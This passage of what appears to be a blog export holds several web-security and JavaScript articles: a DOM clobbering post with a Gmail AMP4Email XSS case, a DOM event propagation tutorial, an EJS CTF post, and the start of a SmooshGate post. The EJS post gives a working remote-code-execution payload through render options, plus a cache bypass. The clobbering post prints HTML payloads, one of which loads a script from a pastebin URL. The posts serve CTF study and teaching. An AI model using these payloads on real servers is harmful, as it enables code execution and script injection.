// &lt;form id=\"config\"> console.log(config.isTest) // &lt;input name=\"isTest\" /> console.log(config.isProd) // &lt;button id=\"isProd\">&lt;/button> &lt;/script> &lt;/body> &lt;/html> In this way, a two-layer DOM clobbering can be constructed. However, one thing to note is that there is no a available here, so toString will become a form that cannot be used. The more likely opportunity here is when what you want to overwrite is accessed using value, for example: config.enviroment.value, you can use the input’s value attribute to overwrite: &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;form id=\"config\"> &lt;input name=\"enviroment\" value=\"test\" /> &lt;/form> &lt;script> console.log(config.enviroment.value) // test &lt;/script> &lt;/body> &lt;/html> In short, only those built-in attributes can be overwritten, and others cannot. In addition to using the hierarchical nature of HTML itself, another feature can be used: HTMLCollection. In the spec we saw earlier about Named access on the Window object, the paragraph that determines the value is written as follows: If there are multiple things to be returned, return an HTMLCollection. &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;a id=\"config\">&lt;/a> &lt;a id=\"config\">&lt;/a> &lt;script> console.log(config) // HTMLCollection(2) &lt;/script> &lt;/body> &lt;/html> So what can we do with an HTMLCollection? In 4.2.10.2. Interface HTMLCollection, it is written that we can use the name or id to get the elements inside the HTMLCollection. Like this: &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;a id=\"config\">&lt;/a> &lt;a id=\"config\" name=\"apiUrl\" href=\"https://huli.tw\">&lt;/a> &lt;script> console.log(config.apiUrl + '') // https://huli.tw &lt;/script> &lt;/body> &lt;/html> We can generate an HTMLCollection through the same named id, and then use the name to retrieve a specific element in the HTMLCollection, achieving the effect of two layers. And if we combine the form with the HTMLCollection, we can achieve three layers: &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;form id=\"config\">&lt;/form> &lt;form id=\"config\" name=\"prod\"> &lt;input name=\"apiUrl\" value=\"123\" /> &lt;/form> &lt;script> console.log(config.prod.apiUrl.value) //123 &lt;/script> &lt;/body> &lt;/html> First, we use the same named id to allow config to get the HTMLCollection, then use config.prod to get the element with the name “prod” in the HTMLCollection, which is the form, and then use form.apiUrl to get the input under the form, and finally use value to get the attribute inside. So if the attribute to be retrieved is an HTML attribute, it can be four layers, otherwise it can only be three layers. More levels of DOM ClobberingAs mentioned earlier, three layers or conditionally four layers are already the limit. Is there a way to break through the limit? According to the method given in DOM Clobbering strikes back, there is, using an iframe! When you create an iframe and give it a name, you can use this name to refer to the window inside the iframe, so you can do this: &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;iframe name=\"config\" srcdoc=' &lt;a id=\"apiUrl\">&lt;/a> '>&lt;/iframe> &lt;script> setTimeout(() => &#123; console.log(config.apiUrl) // &lt;a id=\"apiUrl\">&lt;/a> &#125;, 500) &lt;/script> &lt;/body> &lt;/html> The reason why setTimeout is needed here is that the iframe is not loaded synchronously, so it takes some time to correctly retrieve the contents inside the iframe. With the help of the iframe, you can create more levels: &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;iframe name=\"moreLevel\" srcdoc=' &lt;form id=\"config\">&lt;/form> &lt;form id=\"config\" name=\"prod\"> &lt;input name=\"apiUrl\" value=\"123\" /> &lt;/form> '>&lt;/iframe> &lt;script> setTimeout(() => &#123; console.log(moreLevel.config.prod.apiUrl.value) //123 &#125;, 500) &lt;/script> &lt;/body> &lt;/html> In theory, you can use another iframe inside the iframe to achieve an infinite number of levels of DOM clobbering, but I tried it and found that there may be some encoding issues that need to be addressed, for example, like this: &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;iframe name=\"level1\" srcdoc=' &lt;iframe name=\"level2\" srcdoc=\" &lt;iframe name=\"level3\">&lt;/iframe> \">&lt;/iframe> '>&lt;/iframe> &lt;script> setTimeout(() => &#123; console.log(level1.level2.level3) // undefined &#125;, 500) &lt;/script> &lt;/body> &lt;/html> It will print undefined, but if you remove the double quotes from the level3 and write it directly as name=level3, you can successfully print out the contents. I guess it is due to some parsing issues with single and double quotes, and I haven’t found a solution yet. Only this attempt is okay, but it will fail if you go further down: &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;iframe name=\"level1\" srcdoc=\" &lt;iframe name=&amp;quot;level2&amp;quot; srcdoc=&amp;quot; &lt;iframe name='level3' srcdoc=' &lt;iframe name=level4>&lt;/iframe> '>&lt;/iframe> &amp;quot;>&lt;/iframe> \">&lt;/iframe> &lt;script> setTimeout(() => &#123; console.log(level1.level2.level3.level4) &#125;, 500) &lt;/script> &lt;/body> &lt;/html> But in real life, you probably won’t go that deep, so four or five layers are already enough. Update on August 14, 2021:Thanks to a friend’s notification, you can achieve an infinite number of layers like this: &lt;iframe name=a srcdoc=\" &lt;iframe name=b srcdoc=&amp;quot &lt;iframe name=c srcdoc=&amp;amp;quot; &lt;iframe name=d srcdoc=&amp;amp;amp;quot; &lt;iframe name=e srcdoc=&amp;amp;amp;amp;quot; &lt;iframe name=f srcdoc=&amp;amp;amp;amp;amp;quot; &lt;div id=g>123&lt;/div> &amp;amp;amp;amp;amp;quot;>&lt;/iframe> &amp;amp;amp;amp;quot;>&lt;/iframe> &amp;amp;amp;quot;>&lt;/iframe> &amp;amp;quot;>&lt;/iframe> &amp;quot>&lt;/iframe> \">&lt;/iframe> Case Study: Gmail AMP4Email XSSIn 2019, there was a vulnerability in Gmail that was attacked through DOM clobbering. The complete write-up is here: XSS in GMail’s AMP4Email via DOM Clobbering, and I will briefly describe the process below (all content is taken from the above article). In short, in Gmail, you can use some AMP functions, and Google’s validator for this format is very strict, so it is not possible to XSS through normal methods. But someone found that they could set an id on an HTML element, and when they set a &lt;a id=&quot;AMP_MODE&quot;&gt;, an error suddenly appeared in the console loading the script, and one of the segments in the URL was undefined. After studying the code carefully, there was a piece of code that looked like this: var script = window.document.createElement(\"script\"); script.async = false; var loc; if (AMP_MODE.test &amp;&amp; window.testLocation) &#123; loc = window.testLocation &#125; else &#123; loc = window.location; &#125; if (AMP_MODE.localDev) &#123; loc = loc.protocol + \"//\" + loc.host + \"/dist\" &#125; else &#123; loc = \"https://cdn.ampproject.org\"; &#125; var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + \"/\" : \"\"; b.src = loc + \"/rtv/\" + AMP_MODE.rtvVersion; + \"/\" + singlePass + \"v0/\" + pluginName + \".js\"; document.head.appendChild(b); If we can make both AMP_MODE.test and AMP_MODE.localDev truthy, and then set window.testLocation, we can load any script! So the exploit would look like this: // 讓 AMP_MODE.test 跟 AMP_MODE.localDev 有東西 &lt;a id=\"AMP_MODE\" name=\"localDev\">&lt;/a> &lt;a id=\"AMP_MODE\" name=\"test\">&lt;/a> // 設置 testLocation.protocol &lt;a id=\"testLocation\">&lt;/a> &lt;a id=\"testLocation\" name=\"protocol\" href=\"https://pastebin.com/raw/0tn8z0rG#\">&lt;/a> Finally, we can successfully load any script and achieve XSS! (However, the author was only able to get this far before being blocked by CSP). This is probably one of the most famous cases of DOM Clobbering. ConclusionAlthough the use cases for DOM Clobbering are limited, it is a very interesting attack method! And if you don’t know about this feature, you may not have thought about how HTML can affect the content of global variables. If you are interested in this attack method, you can refer to PortSwigger’s article, which provides two labs for you to try this attack method yourself. Just reading about it is not enough, you need to actually attack to fully understand it. References: Expanding XSS with Dom Clobbering DOM Clobbering strikes back DOM Clobbering Attack Learning Record.md DOM Clobbering Learning Record XSS in GMail’s AMP4Email via DOM Clobbering Is there a spec that the id of elements should be made global variable? Why don’t we just use element IDs as identifiers in JavaScript? Do DOM tree elements with ids become global variables?","link":"/2021/01/23/en/dom-clobbering/"},{"title":"DOM Event Propagation: Capturing and Bubbling","text":"Introduction(Supplement: Thanks to the guidance of senior othree, it is pointed out that this is actually talking about the order of event propagation in the DOM, so the title and content are revised. The original title is: JavaScript Event Propagation: Capturing and Bubbling) Today, we bring you the event propagation mechanism in the DOM, and the code related to these events, I believe everyone should be familiar with, that is addEventListener, preventDefault and stopPropagation. Simply put, it is the order in which events are propagated in the DOM, and what you can do with these events. Why is there the term “propagation order”? Suppose you have a ul element with many li elements underneath, representing different items. When you click on any li, you actually click on ul because ul wraps all li. If I add eventListener to two elements, which one will be executed first? At this time, it is important to know the execution order of events. In addition, because the mechanism of some browsers (yes, I am talking about IE) is different, I will not mention those things at all. Those who are interested can study the reference materials attached at the end of the article. Simple ExampleTo facilitate later explanation, we first write a very simple example: &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;ul id=\"list\"> &lt;li id=\"list_item\"> &lt;a id=\"list_item_link\" target=\"_blank\" href=\"http://google.com\"> google.com &lt;/a> &lt;/li> &lt;/ul> &lt;/body> &lt;/html> In this example, there is an outermost ul, followed by li, and finally a hyperlink. For ease of identification, the naming of the id is also related to the hierarchical structure. The DOM diagram looks like this: With this simple HTML structure, we can clearly explain the event propagation mechanism in the DOM. Three Phases of EventsTo add a click event to a DOM, you would write: const $list = document.getElementById('list'); $list.addEventListener('click', (e) => &#123; console.log('click!'); &#125;) The e here contains many related parameters of this event, one of which is called eventPhase, which is a number indicating which phase the event is triggered in. const $list = document.getElementById('list'); $list.addEventListener('click', (e) => &#123; console.log(e.eventPhase); &#125;) The definition of eventPhase can be found in the DOM specification: &#x2F;&#x2F; PhaseType const unsigned short CAPTURING_PHASE &#x3D; 1; const unsigned short AT_TARGET &#x3D; 2; const unsigned short BUBBLING_PHASE &#x3D; 3; These three stages are the focus of our discussion today. When the DOM event propagates, it starts from the root node and goes down to the target. If you add an event here, it will be in the CAPTURING_PHASE, the capturing phase. target is the target you clicked on. At this time, the eventListenr added to target will be AT_TARGET phase. Finally, the event is propagated back up from the child node to the root node, and this is called the BUBBLING_PHASE, which is also the more familiar bubbling phase. You may find it confusing to understand the text, so I’ll directly quote a w3c diagram about event flow, which should make it clear for everyone. When you click on a td, the click event will start from the window and propagate down to the td, which is called the CAPTURING_PHASE. Then the event is dispatched to the td itself, which is called the AT_TARGET. Finally, the event bubbles up from the td to the window, which is called the BUBBLING_PHASE. Therefore, when reading articles about event mechanisms, you will often see a slogan: Capture first, bubble later. That’s how it works. But how do I decide whether to listen to this event in the capturing phase or the bubbling phase? Actually, we still use the familiar addEventListener, but this function actually has a third parameter. true means adding this listener to the capturing phase, false or not passing it means adding this listener to the bubbling phase. PracticeAfter understanding the event propagation mechanism, let’s take the simple example we wrote above to demonstrate it. First, let’s attach the event to each element in each phase and see if the result is the same as expected: const get = (id) => document.getElementById(id); const $list = get('list'); const $list_item = get('list_item'); const $list_item_link = get('list_item_link'); // list capturing $list.addEventListener('click', (e) => &#123; console.log('list capturing', e.eventPhase); &#125;, true) // list bubbling $list.addEventListener('click', (e) => &#123; console.log('list bubbling', e.eventPhase); &#125;, false) // list_item capturing $list_item.addEventListener('click', (e) => &#123; console.log('list_item capturing', e.eventPhase); &#125;, true) // list_item bubbling $list_item.addEventListener('click', (e) => &#123; console.log('list_item bubbling', e.eventPhase); &#125;, false) // list_item_link capturing $list_item_link.addEventListener('click', (e) => &#123; console.log('list_item_link capturing', e.eventPhase); &#125;, true) // list_item_link bubbling $list_item_link.addEventListener('click', (e) => &#123; console.log('list_item_link bubbling', e.eventPhase); &#125;, false) Click on the hyperlink and the console will output the following results: list capturing 1 list_item capturing 1 list_item_link capturing 2 list_item_link bubbling 2 list_item bubbling 3 list bubbling 3 1 is CAPTURING_PHASE, 2 is AT_TARGET, and 3 is BUBBLING_PHASE. From here, it is clear that the event does propagate from the top to the target, and during this propagation process, we use the third parameter of addEventListenr to add the listener to the CAPTURING_PHASE. Then the event is passed to the hyperlink (a#list_item_link) that we clicked on. Here, regardless of whether you use the third parameter of addEventListener as true or false, e.eventPhase will become AT_TARGET. Finally, it bubbles back from the target, first to the parent #list_item, then to the grandparent #list. A small trap of capturing and bubblingSince it is capturing first and then bubbling, it means that no matter how the order of addEventListener changes, the output should still be the same. Let’s switch the order of capturing and bubbling and see if the output is still the same. const get = (id) => document.getElementById(id); const $list = get('list'); const $list_item = get('list_item'); const $list_item_link = get('list_item_link'); // list bubbling $list.addEventListener('click', (e) => &#123; console.log('list bubbling', e.eventPhase); &#125;, false) // list capturing $list.addEventListener('click', (e) => &#123; console.log('list capturing', e.eventPhase); &#125;, true) // list_item bubbling $list_item.addEventListener('click', (e) => &#123; console.log('list_item bubbling', e.eventPhase); &#125;, false) // list_item capturing $list_item.addEventListener('click', (e) => &#123; console.log('list_item capturing', e.eventPhase); &#125;, true) // list_item_link bubbling $list_item_link.addEventListener('click', (e) => &#123; console.log('list_item_link bubbling', e.eventPhase); &#125;, false) // list_item_link capturing $list_item_link.addEventListener('click', (e) => &#123; console.log('list_item_link capturing', e.eventPhase); &#125;, true) Clicking on the hyperlink will output: list capturing 1 list_item capturing 1 list_item_link bubbling 2 list_item_link capturing 2 list_item bubbling 3 list bubbling 3 It can be seen that something magical happened, which is that the listener added in the bubbling phase was executed before the listener added in the capturing phase. Why is this? In fact, as mentioned earlier, when the event is passed to the actual target, which is e.target, regardless of whether you use the third parameter of addEventListener as true or false, e.eventPhase will become AT_TARGET. Since it has become AT_TARGET here, there is no distinction between capturing and bubbling, so the execution order will be determined by the order in which you added the addEventListener, with the first added being executed first and the last added being executed last. Therefore, this is why when we switched the order of capturing and bubbling, list_item_link bubbling appeared first. Regarding the order of event propagation, just remember two principles: Capturing first, then bubbling When the event is passed to the target itself, there is no distinction between capturing and bubbling jsbin example code Cancel event propagationNext, what we are going to talk about is that since this event chain is so long, there must be a way to interrupt this chain and stop the event propagation from continuing. And this method should be familiar to everyone, which is: e.stopPropagation. Wherever you add it, the event propagation will stop there and will not continue to propagate downward. For example, using the example above, if I add a capture phase to #list: // list 的捕獲 $list.addEventListener('click', (e) => &#123; console.log('list capturing', e.eventPhase); e.stopPropagation(); &#125;, true) Then, the console will only output: list capturing 1 Because the event propagation is stopped, the remaining listeners will not receive any more events. However, there is still one thing to note here. The “event propagation is stopped” here means that the event will not be passed to the “next node”, but if you have more than one listener on the same node, they will still be executed. For example: // list 的捕獲 $list.addEventListener('click', (e) => &#123; console.log('list capturing'); e.stopPropagation(); &#125;, true) // list 的捕獲 2 $list.addEventListener('click', (e) => &#123; console.log('list capturing2'); &#125;, true) The output is: list capturing list capturing2 Even though e.stopPropagation has been used, the remaining listeners on the same level will still be executed. If you want to prevent other listeners on the same level from being executed, you can use e.stopImmediatePropagation(); instead. For example: // list 的捕獲 $list.addEventListener('click', (e) => &#123; console.log('list capturing'); e.stopImmediatePropagation(); &#125;, true) // list 的捕獲 2 $list.addEventListener('click', (e) => &#123; console.log('list capturing2'); &#125;, true) The output is: list capturing Preventing Default BehaviorPeople often confuse e.stopPropagation and e.preventDefault. The former we just explained, which is to stop the event from propagating, while the latter is to prevent the default behavior of the browser. The most common practice is to prevent hyperlinks, for example: // list_item_link 的冒泡 $list_item_link.addEventListener('click', (e) => &#123; e.preventDefault(); &#125;, false) This way, when you click on a hyperlink, the original default behavior (opening a new tab or redirecting) will not be executed, and nothing will happen. This is the function of preventDefault. Therefore, preventDefault has “nothing to do with” JavaScript’s event propagation. Even if you add this line, the event will still propagate. One thing worth noting is that W3C’s documentation states: Once preventDefault has been called it will remain in effect throughout the remainder of the event’s propagation. This means that once preventDefault is called, it will remain effective in the events that follow. Let’s look at an example: // list 的捕獲 $list.addEventListener('click', (e) => &#123; console.log('list capturing', e.eventPhase); e.preventDefault(); &#125;, true) We have already written e.preventDefault() in the capture event of #list, and according to the documentation, this effect will continue in the events that follow. Therefore, when the event is passed to #list_item_link, you will find that clicking on the hyperlink still has no response. Practical ApplicationsNow that we know the event propagation mechanism, how to stop the propagation of events, and how to prevent default behavior, what are their practical applications in actual development? The most common usage is actually event delegation. For example, if you have a ul with 1000 li elements, if you add an event listener to each li, you will create 1000 new functions. However, as we just learned, any click event on an li will actually be passed to the ul, so we can just add a listener to the ul. &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;ul id=\"list\"> &lt;li data-index=\"1\">1&lt;/li> &lt;li data-index=\"2\">2&lt;/li> &lt;li data-index=\"3\">3&lt;/li> &lt;/ul> &lt;/body> &lt;/html> document.getElementById('list').addEventListener('click', (e) => &#123; console.log(e.target.getAttribute('data-index')); &#125;) The advantage of this is that when you add or delete an li, you don’t have to deal with the listener related to that element, because your listener is on the ul. This way of handling events through parent nodes is called event delegation. In addition, I have thought of several interesting applications that you can refer to. For example, the e.preventDefault() we just mentioned. Since we know the principle and usage skills, we can use it like this: window.addEventListener('click', (e) => &#123; e.preventDefault(); e.stopPropagation(); &#125;, true); With just this code, you can disable all elements on the page, and clicking on them will have no response, such as clicking on an &lt;a&gt; tag will not jump to the hyperlink, and clicking on a &lt;form&gt; submit button will not work. And because the event propagation is prevented, other onClick events will not be executed either. Or, you can use it like this: window.addEventListener('click', (e) => &#123; console.log(e.target); &#125;, true) Using the characteristics of event propagation, using capture on the window can ensure that it is the first event to be executed. You can detect the click of every element on the page in this function and return it for data statistics and analysis. ConclusionThe event propagation mechanism of the DOM is relatively simple among the many classic JavaScript interview questions, as long as you can grasp the principles and order of event propagation, it is almost the same. The difference between e.preventDefault and e.stopPropagation can also be understood roughly after knowing the order of event propagation. The former only cancels the default behavior and has nothing to do with event propagation, while the latter prevents the event from propagating downward. I hope this article can help you understand the event propagation mechanism of the DOM. If there is anything wrong, please feel free to point it out. Thank you. Reference materials (the latter original materials are more recommended): JavaScript 详说事件机制之冒泡、捕获、传播、委托 Javascript 事件冒泡和捕获的一些探讨 浅谈 javascript 事件取消和阻止冒泡 What Is Event Bubbling in JavaScript? Event Propagation Explained What is event bubbling and capturing? Event order Document Object Model Events","link":"/2017/08/27/en/dom-event-capture-and-propagation/"},{"title":"EJS Vulnerabilities in CTF","text":"Originally, I intended to write this article from a developer’s perspective. However, due to time constraints, I will first write a CTF-oriented article to record this issue. I will write from a developer’s perspective when I have more time. In short, this article discusses the problems caused by using the following pattern: const express = require('express') const app = express() const port = 3000 app.set('view engine', 'ejs'); app.get('/', (req,res) => &#123; res.render('index', req.query); &#125;) app.listen(port, () => &#123; console.log(`Example app listening on port $&#123;port&#125;`) &#125;) Previous CTF challengesThere are two types of EJS-related challenges that have been created in CTFs. The first type is where you can control the second parameter of the render function, as shown above. The second type is where you cannot control the second parameter, but there is a prototype pollution vulnerability. For the first type, I personally think that EJS’s handling of parameters is problematic. You may think that only data is passed in, but in fact, options and data are passed together. Therefore, you can modify options to control some execution processes and achieve RCE. For the second type, the main idea is to pollute outputFunctionName through prototype pollution, and then rely on EJS’s underlying code to concatenate JS code to achieve RCE. However, EJS has added checks for outputFunctionName to ensure that the input is a valid variable name. This article mainly discusses the first type of situation. Below are some related challenges that have appeared in the past. In the early days, prototype pollution was the main focus, but recently, more challenges are more about passing an object. Codegate CTF 2023 Preliminary - Music Player SEETF 2023 - Express JavaScript Security justCTF 2023 - Perfect Product hxp CTF 2022 - valentine Pwn2Win CTF 2021 - Illusion AIS3 EOF CTF 2019 Quals - echo XNUCA 2019 Qualifier - hardjs Root CauseAfter calling res.render(), it will first go to express&#x2F;lib&#x2F;response.js: res.render = function render(view, options, callback) &#123; var app = this.req.app; var done = callback; var opts = options || &#123;&#125;; var req = this.req; var self = this; // support callback function as second arg if (typeof options === 'function') &#123; done = options; opts = &#123;&#125;; &#125; // merge res.locals opts._locals = self.locals; // default callback to respond done = done || function (err, str) &#123; if (err) return req.next(err); self.send(str); &#125;; // render app.render(view, opts, done); &#125;; Then, let’s check app.render in express&#x2F;lib&#x2F;application.js: app.render = function render(name, options, callback) &#123; var cache = this.cache; var done = callback; var engines = this.engines; var opts = options; var renderOptions = &#123;&#125;; var view; // support callback function as second arg if (typeof options === 'function') &#123; done = options; opts = &#123;&#125;; &#125; // merge app.locals merge(renderOptions, this.locals); // merge options._locals if (opts._locals) &#123; merge(renderOptions, opts._locals); &#125; // merge options merge(renderOptions, opts); // set .cache unless explicitly provided if (renderOptions.cache == null) &#123; renderOptions.cache = this.enabled('view cache'); &#125; // primed cache if (renderOptions.cache) &#123; view = cache[name]; &#125; // view if (!view) &#123; var View = this.get('view'); view = new View(name, &#123; defaultEngine: this.get('view engine'), root: this.get('views'), engines: engines &#125;); if (!view.path) &#123; var dirs = Array.isArray(view.root) &amp;&amp; view.root.length > 1 ? 'directories \"' + view.root.slice(0, -1).join('\", \"') + '\" or \"' + view.root[view.root.length - 1] + '\"' : 'directory \"' + view.root + '\"' var err = new Error('Failed to lookup view \"' + name + '\" in views ' + dirs); err.view = view; return done(err); &#125; // prime the cache if (renderOptions.cache) &#123; cache[name] = view; &#125; &#125; // render tryRender(view, renderOptions, done); &#125;; Finally, tryRender is called, and the code is in express&#x2F;lib&#x2F;application.js: function tryRender(view, options, callback) &#123; try &#123; view.render(options, callback); &#125; catch (err) &#123; callback(err); &#125; &#125; This view.render will call the __express method inside the view engine, and this method in EJS is renderFile: ejs&#x2F;lib&#x2F;ejs.js: /** * Express.js support. * * This is an alias for &#123;@link module:ejs.renderFile&#125;, in order to support * Express.js out-of-the-box. * * @func */ exports.__express = exports.renderFile; renderFile: exports.renderFile = function () &#123; var args = Array.prototype.slice.call(arguments); var filename = args.shift(); var cb; var opts = &#123;filename: filename&#125;; var data; var viewOpts; // Do we have a callback? if (typeof arguments[arguments.length - 1] == 'function') &#123; cb = args.pop(); &#125; // Do we have data/opts? if (args.length) &#123; // Should always have data obj data = args.shift(); // Normal passed opts (data obj + opts obj) if (args.length) &#123; // Use shallowCopy so we don't pollute passed in opts obj with new vals utils.shallowCopy(opts, args.pop()); &#125; // Special casing for Express (settings + opts-in-data) else &#123; // Express 3 and 4 if (data.settings) &#123; // Pull a few things from known locations if (data.settings.views) &#123; opts.views = data.settings.views; &#125; if (data.settings['view cache']) &#123; opts.cache = true; &#125; // Undocumented after Express 2, but still usable, esp. for // items that are unsafe to be passed along with data, like `root` viewOpts = data.settings['view options']; if (viewOpts) &#123; utils.shallowCopy(opts, viewOpts); &#125; &#125; // Express 2 and lower, values set in app.locals, or people who just // want to pass options in their data. NOTE: These values will override // anything previously set in settings or settings['view options'] utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS); &#125; opts.filename = filename; &#125; else &#123; data = utils.createNullProtoObjWherePossible(); &#125; return tryHandleCache(opts, data, cb); &#125;; The key point here is the middle part: if (data.settings) &#123; // Pull a few things from known locations if (data.settings.views) &#123; opts.views = data.settings.views; &#125; if (data.settings['view cache']) &#123; opts.cache = true; &#125; // Undocumented after Express 2, but still usable, esp. for // items that are unsafe to be passed along with data, like `root` viewOpts = data.settings['view options']; if (viewOpts) &#123; utils.shallowCopy(opts, viewOpts); &#125; &#125; In short, setting data.settings[&#39;view options&#39;] can override opts. Next, follow down to handleCache: function handleCache(options, template) &#123; var func; var filename = options.filename; var hasTemplate = arguments.length > 1; if (options.cache) &#123; if (!filename) &#123; throw new Error('cache option requires a filename'); &#125; func = exports.cache.get(filename); if (func) &#123; return func; &#125; if (!hasTemplate) &#123; template = fileLoader(filename).toString().replace(_BOM, ''); &#125; &#125; else if (!hasTemplate) &#123; // istanbul ignore if: should not happen at all if (!filename) &#123; throw new Error('Internal EJS error: no file name or template ' + 'provided'); &#125; template = fileLoader(filename).toString().replace(_BOM, ''); &#125; func = exports.compile(template, options); if (options.cache) &#123; exports.cache.set(filename, func); &#125; return func; &#125; If options.cache is set, use the already compiled content in the cache, otherwise compile it again. The most important part is compile, which has the following code: if (opts.client) &#123; src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\\n' + src; if (opts.compileDebug) &#123; src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\\n' + src; &#125; &#125; It will use escapeFn to concatenate the code. So we just need to pass in: const payload = &#123; settings: &#123; 'view options': &#123; client: true, escapeFunction: '(() => &#123;&#125;);return process.mainModule.require(\"child_process\").execSync(\"id\").toString()' &#125; &#125; &#125; to execute any code and achieve RCE. Cache IssueAlthough the previous explanation was smooth, there is a cache issue. Under production mode, view cache will be automatically enabled: if (env === 'production') &#123; this.enable('view cache'); &#125; And this parameter will be automatically passed to options when rendering: // set .cache unless explicitly provided if (renderOptions.cache == null) &#123; renderOptions.cache = this.enabled('view cache'); &#125; Although we can override the original options through view options, if the original options already contain cache, it will be overridden again: utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA_EXPRESS); If we cannot override cache, then we cannot use the above method because the template will not be recompiled. However, it doesn’t matter, fortunately this is JavaScript, pay attention to this line of code: if (renderOptions.cache == null) &#123; renderOptions.cache = this.enabled('view cache'); &#125; If renderOptions.cache is null, it will be set, and 0 == null is false, so we can pass in cache: 0 to bypass the check and make if (options.cache) false. EJS Author’s ViewIn fact, EJS has had many related issues since the past, the list is as follows: Unrestricted render option may lead to a RCE vulnerability #451 Mitigate prototype pollution effects #601 [Vulnerability] Server side template injection leads to RCE #663 EJS, Server side template injection ejs@3.1.9 Latest #720 EJS@3.1.9 has a server-side template injection vulnerability (Unfixed) #735 The author’s stance has remained the same from the past to the present: The problem here is that EJS is simply a way of executing JS to render a template. If you allow passing of arbitrary&#x2F;unsanitized options and data to the render function, you will encounter all security problems that would occur as a result of arbitrary code execution. Henny Youngman used to tell a joke: “The patient says, ‘Doctor, it hurts when I do this.’ So the doctor says, ‘Then don’t do that!’” I’m open to PRs that improve security, but this looks to me to be far beyond the purview of the library. These responsibilities live squarely in userland. Basically, if developers want to use the library in this way, the author cannot do anything about it. This is not the responsibility of EJS and end users should not be allowed to pass in the entire object. Recently, EJS developers have also added a notice in the README and on the official website due to receiving many similar issue reports: Security professionals, before reporting any security issues, please reference the SECURITY.md in this project, in particular, the following: “EJS is effectively a JavaScript runtime. Its entire job is to execute JavaScript. If you run the EJS render method without checking the inputs yourself, you are responsible for the results.” So this trick can be used now and in the future. If someone can control the object during rendering, it means that RCE can be achieved. Later, I want to write another article from the developer’s perspective. Although what the EJS author said makes sense, at least as a library, EJS should remind developers in the documentation not to use it in this way. Although there is already a prompt now, it is more targeted at asking security researchers not to report, rather than asking developers not to use it in this way. Or maybe this is actually a bad coding practice. There should not have been such a pattern in the first place that allows others to exploit it. I haven’t figured this out yet. I’ll write about it when I do.","link":"/2023/06/22/en/ejs-render-vulnerability-ctf/"},{"title":"Don’t break the Web: The Case of SmooshGate and <keygen>","text":"IntroductionRecently, the second edition of YDKJS (You Don’t Know JS) was released, called YDKJSY, where Y stands for Yet. Although the second edition is not yet complete, some of the initial chapters have already been made available on GitHub. I read the first chapter, which talks about the history of JS. It mentioned an interesting issue: As such, sometimes the JS engines will refuse to conform to a specification-dictated change because it would break that web content. In these cases, often TC39 will backtrack and simply choose to conform the specification to the reality of the web. For example, TC39 planned to add a contains(..) method for Arrays, but it was found that this name conflicted with old JS frameworks still in use on some sites, so they changed the name to a non-conflicting includes(..). The same happened with a comedic&#x2F;tragic JS community crisis dubbed “smooshgate”, where the planned flatten(..) method was eventually renamed flat(..). In summary, it means that sometimes the JS specification must compromise with reality (existing old implementations). For example, the Array was originally supposed to add a method called contains, but it was changed to includes due to issues. Flatten was also renamed to flat. There is also a term “smooshgate” that was specially marked above. When searching for this keyword, it was found that it was an event that occurred around March last year, related to the aforementioned flatten. When I saw this, my first reaction was, “Huh, why don’t I know anything?” After searching for information in Traditional Chinese, I found only this article that mentioned it: SmooshGate and this article that only touched on it: [Note] 3 types of JavaScript object property characteristics. After carefully studying the origin and development of the matter, I found it to be an interesting topic, so I wrote this article to share it with everyone. SmooshGate EventMost of the inspiration for this article comes from #SmooshGate FAQ, which explains the event very well. I recommend that you read it. But if you’re too lazy to read it, I’ll briefly explain the origin and development of the matter below. There is an organization called TC39, which stands for Technical Committee 39. It is responsible for matters related to the ECMAScript specification, such as deciding which proposals can pass and so on. Finally, those proposals will be included in the new ECMAScript standard. Proposals are divided into five stages, from stage0 to stage4. I won’t go into detail, but you can refer to Championing a proposal at TC39 or The TC39 Process. There was a proposal before TC39 called Array.prototype.{flatten,flatMap} (flatten is now changed to flat). For readers who are not familiar with what flatten does, it basically flattens nested things. For example, in the following code: let arr = [1, 2, [3], [4], [5, 6, 7]] console.log(arr.flatten()) // [1, 2, 3, 4, 5, 6, 7] The nested array is flattened, which means it is similar to the flatten in lodash. For detailed usage, please refer to MDN, which has an additional parameter called depth that allows you to specify the depth of the expansion. flatMap is to map first and then flatten, which should be familiar to friends who are familiar with RxJS (also known as mergeMap in RxJS, and mergeMap is more commonly used. Interested friends can also refer to this article: concatAll and concatMap rather than flatten and flatMap). Well, this proposal seems good, but what are the problems? The problem lies in a tool that a front-end newcomer may not have heard of: MooTools, which I have only heard of and never used. To quickly understand what it can do, please refer to this comparison article ten years ago: jQuery vs MooTools. In MooTools, they define their own flatten method and do something similar to the following in the code: Array.prototype.flatten = /* ... */; This sounds like no problem, because even if flatten is officially included in the standard and becomes a native method, it will only be overwritten, and there will be no problem. But the trouble is that MooTools also has a piece of code that copies all Array methods to Elements (MooTools’ custom API): for (var key in Array.prototype) &#123; Elements.prototype[key] = Array.prototype[key]; &#125; The for…in syntax will iterate over all enumerable properties, and native methods are not included. For example, running the following code in the Chrome devtool console: for (var key in Array.prototype) &#123; console.log(key) &#125; Nothing will be printed out. But if you add a few custom properties: Array.prototype.foo = 123 Array.prototype.sort = 456 Array.prototype.you_can_see_me = 789 for (var key in Array.prototype) &#123; console.log(key) // foo, you_can_see_me &#125; Only custom properties will be enumerable, and native methods will not become enumerable even if you overwrite them. So what is the problem? The problem is that when flatten has not yet become an Array method, it is just a MooTools custom property, which is enumerable, so it will be copied to Elements. However, when flatten is included in the standard and officially supported by browsers, flatten is no longer enumerable. This means that Elements.prototype.flatten will become undefined, and all code that uses this method will fail. At this point, you may naively think, “Then make flatten enumerable!” But this may cause more problems, because a bunch of old for…in will suddenly have an additional flatten property, which may cause other bugs. The discussion thread that discovered this bug can be found here: Implementing array.prototype.flatten broke MooTools’ version of it. After the issue was raised, discussions began on what to replace 